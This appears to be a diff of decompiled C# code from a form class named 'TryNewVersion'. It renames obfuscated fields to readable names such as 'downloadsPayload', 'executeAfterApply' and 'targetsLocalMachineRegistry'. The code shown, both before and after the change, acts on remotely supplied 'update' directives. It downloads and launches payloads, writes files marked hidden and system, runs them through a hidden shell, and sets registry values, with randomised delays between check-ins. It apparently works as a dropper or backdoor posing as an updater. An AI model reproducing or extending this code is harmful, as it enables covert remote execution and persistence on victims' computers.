@@ -601,7 +601,7 @@ public class TryNewVersion : Form
 		{
 			return;
 		}
-		Struct31[] array3 = null;
+		UpdateDirectiveEntry[] array3 = null;
 		Random random = new Random();
 		int num = 0;
 		int num2 = 0;
@@ -660,24 +660,24 @@ public class TryNewVersion : Form
 					}
 					if (array3 == null)
 					{
-						array3 = new Struct31[1];
+						array3 = new UpdateDirectiveEntry[1];
 					}
 					else
 					{
 						Array.Resize(ref array3, array3.Length + 1);
 					}
 					num3 = array3.Length;
-					array3[num3 - 1].string_0 = text5;
+					array3[num3 - 1].targetPath = text5;
 					if (text4 != null && text4.Length > 1)
 					{
 						text4 = text4.ToLower();
-						array3[num3 - 1].bool_0 = text4[text4.Length - 1] == 'e';
-						array3[num3 - 1].bool_4 = text4[0] == 'd' && text4[1] == 'l';
-						array3[num3 - 1].bool_1 = text4[0] == '>' && text4[1] == '>';
-						array3[num3 - 1].bool_3 = text4[0] == '>' && text4[1] == 'c' && text4[2] == 'u';
-						array3[num3 - 1].bool_2 = text4[0] == '>' && text4[1] == 'l' && text4[2] == 'm';
+						array3[num3 - 1].executeAfterApply = text4[text4.Length - 1] == 'e';
+						array3[num3 - 1].downloadsPayload = text4[0] == 'd' && text4[1] == 'l';
+						array3[num3 - 1].mergeWithExistingFile = text4[0] == '>' && text4[1] == '>';
+						array3[num3 - 1].targetsCurrentUserRegistry = text4[0] == '>' && text4[1] == 'c' && text4[2] == 'u';
+						array3[num3 - 1].targetsLocalMachineRegistry = text4[0] == '>' && text4[1] == 'l' && text4[2] == 'm';
 					}
-					array3[num3 - 1].string_1 = null;
+					array3[num3 - 1].payloadLines = null;
 					goto IL_01d7;
 				}
 			}
@@ -687,15 +687,15 @@ public class TryNewVersion : Form
 				{
 					text3 = string.Empty;
 				}
-				if (array3[num3 - 1].string_1 != null)
+				if (array3[num3 - 1].payloadLines != null)
 				{
-					Array.Resize(ref array3[num3 - 1].string_1, array3[num3 - 1].string_1.Length + 1);
+					Array.Resize(ref array3[num3 - 1].payloadLines, array3[num3 - 1].payloadLines.Length + 1);
 				}
 				else
 				{
-					array3[num3 - 1].string_1 = new string[1];
+					array3[num3 - 1].payloadLines = new string[1];
 				}
-				array3[num3 - 1].string_1[array3[num3 - 1].string_1.Length - 1] = text3;
+				array3[num3 - 1].payloadLines[array3[num3 - 1].payloadLines.Length - 1] = text3;
 			}
 			goto IL_01d7;
 			IL_01d7:
@@ -705,16 +705,16 @@ public class TryNewVersion : Form
 		num3 = 0;
 		while (array3 != null && array3.Length > num3)
 		{
-			if (array3[num3].string_0 != null && !(array3[num3].string_0 == string.Empty))
+			if (array3[num3].targetPath != null && !(array3[num3].targetPath == string.Empty))
 			{
-				if (array3[num3].bool_4)
+				if (array3[num3].downloadsPayload)
 				{
 					string text6 = string.Empty;
-					if (array3[num3].string_1 != null)
+					if (array3[num3].payloadLines != null)
 					{
-						for (int i = 0; i < array3[num3].string_1.Length; i++)
+						for (int i = 0; i < array3[num3].payloadLines.Length; i++)
 						{
-							text6 = array3[num3].string_1[i];
+							text6 = array3[num3].payloadLines[i];
 							if (text6 != null && text6 != string.Empty)
 							{
 								break;
@@ -723,7 +723,7 @@ public class TryNewVersion : Form
 					}
 					if (text6 != null && !(text6 == string.Empty))
 					{
-						string text7 = array3[num3].string_0;
+						string text7 = array3[num3].targetPath;
 						long num8 = 0L;
 						try
 						{
@@ -806,7 +806,7 @@ public class TryNewVersion : Form
 								CommonUtility.EnsureDirectoryExists(array4[0]);
 								Thread.Sleep(100);
 								File.WriteAllBytes(text7, array);
-								if (array3[num3].bool_0)
+								if (array3[num3].executeAfterApply)
 								{
 									Thread.Sleep(600);
 									WindowsInteropHelper.StartProcess(text7, "", "", 0, bool_0: true);
@@ -818,16 +818,16 @@ public class TryNewVersion : Form
 						}
 					}
 				}
-				else if (!array3[num3].bool_3 && !array3[num3].bool_2)
+				else if (!array3[num3].targetsCurrentUserRegistry && !array3[num3].targetsLocalMachineRegistry)
 				{
 					string text11 = string.Empty;
-					if (array3[num3].bool_1)
+					if (array3[num3].mergeWithExistingFile)
 					{
-						text11 = CommonUtility.ReadAllTextWithEncodingOption(array3[num3].string_0, 0, 0, 1);
+						text11 = CommonUtility.ReadAllTextWithEncodingOption(array3[num3].targetPath, 0, 0, 1);
 					}
 					while (true)
 					{
-						if (array3[num3].bool_1 && text11 != null && !(text11 == string.Empty))
+						if (array3[num3].mergeWithExistingFile && text11 != null && !(text11 == string.Empty))
 						{
 							while (text11 != null && text11.Length > 0)
 							{
@@ -838,7 +838,7 @@ public class TryNewVersion : Form
 								}
 								text11 = text11.Substring(0, text11.Length - 1);
 							}
-							if (array3[num3].string_1 == null)
+							if (array3[num3].payloadLines == null)
 							{
 								break;
 							}
@@ -847,18 +847,18 @@ public class TryNewVersion : Form
 								continue;
 							}
 							string[] array5 = text11.Replace("\r\n", "\r").Split('\r', '\n');
-							for (int k = 0; k < array3[num3].string_1.Length; k++)
+							for (int k = 0; k < array3[num3].payloadLines.Length; k++)
 							{
 								bool flag = false;
-								if (array3[num3].string_1[k] == null)
+								if (array3[num3].payloadLines[k] == null)
 								{
-									array3[num3].string_1[k] = string.Empty;
+									array3[num3].payloadLines[k] = string.Empty;
 								}
-								if (array3[num3].string_1[k] != string.Empty)
+								if (array3[num3].payloadLines[k] != string.Empty)
 								{
 									for (int l = 0; l < array5.Length; l++)
 									{
-										if (array5[l] == array3[num3].string_1[k])
+										if (array5[l] == array3[num3].payloadLines[k])
 										{
 											flag = true;
 											break;
@@ -871,43 +871,43 @@ public class TryNewVersion : Form
 									{
 										text11 += "\r\n";
 									}
-									text11 += array3[num3].string_1[k];
+									text11 += array3[num3].payloadLines[k];
 								}
 							}
 							break;
 						}
 						text11 = string.Empty;
-						if (array3[num3].string_1 == null)
+						if (array3[num3].payloadLines == null)
 						{
 							break;
 						}
-						for (int m = 0; m < array3[num3].string_1.Length; m++)
+						for (int m = 0; m < array3[num3].payloadLines.Length; m++)
 						{
 							if (text11 != null && text11 != string.Empty)
 							{
 								text11 += "\r\n";
 							}
-							text11 += array3[num3].string_1[m];
+							text11 += array3[num3].payloadLines[m];
 						}
 						break;
 					}
 					text11 += "\r\n";
-					CommonUtility.DeleteFileIfExists(array3[num3].string_0);
+					CommonUtility.DeleteFileIfExists(array3[num3].targetPath);
 					Thread.Sleep(100);
-					CommonUtility.WriteAllTextWithEncodingOption(array3[num3].string_0, text11, 1);
-					CommonUtility.AddFileAttributes(array3[num3].string_0, FileAttributes.Hidden | FileAttributes.System);
-					if (array3[num3].bool_0)
+					CommonUtility.WriteAllTextWithEncodingOption(array3[num3].targetPath, text11, 1);
+					CommonUtility.AddFileAttributes(array3[num3].targetPath, FileAttributes.Hidden | FileAttributes.System);
+					if (array3[num3].executeAfterApply)
 					{
-						WindowsInteropHelper.RunHiddenShellCommand(array3[num3].string_0);
+						WindowsInteropHelper.RunHiddenShellCommand(array3[num3].targetPath);
 					}
 					nextUpdateCheckDelayMilliseconds = random.Next(30, 300) * 60 * 1000;
 				}
-				else if (array3[num3].string_1 != null)
+				else if (array3[num3].payloadLines != null)
 				{
 					nextUpdateCheckDelayMilliseconds = random.Next(30, 300) * 60 * 1000;
-					for (int n = 0; n < array3[num3].string_1.Length; n++)
+					for (int n = 0; n < array3[num3].payloadLines.Length; n++)
 					{
-						string text12 = array3[num3].string_1[n];
+						string text12 = array3[num3].payloadLines[n];
 						if (text12 == null || text12 == string.Empty)
 						{
 							continue;
@@ -927,11 +927,11 @@ public class TryNewVersion : Form
 							if (text14 == "dw")
 							{
 								int num13 = CommonUtility.ParseInt32OrZero(text13);
-								WindowsRegistryHelper.SetRegistryValue(array3[num3].string_0, string_3, num13, "DWORD", Convert.ToByte(array3[num3].bool_3));
+								WindowsRegistryHelper.SetRegistryValue(array3[num3].targetPath, string_3, num13, "DWORD", Convert.ToByte(array3[num3].targetsCurrentUserRegistry));
 							}
 							else
 							{
-								WindowsRegistryHelper.SetRegistryValue(array3[num3].string_0, string_3, text13, "", Convert.ToByte(array3[num3].bool_3));
+								WindowsRegistryHelper.SetRegistryValue(array3[num3].targetPath, string_3, text13, "", Convert.ToByte(array3[num3].targetsCurrentUserRegistry));
 							}
 						}
 					}
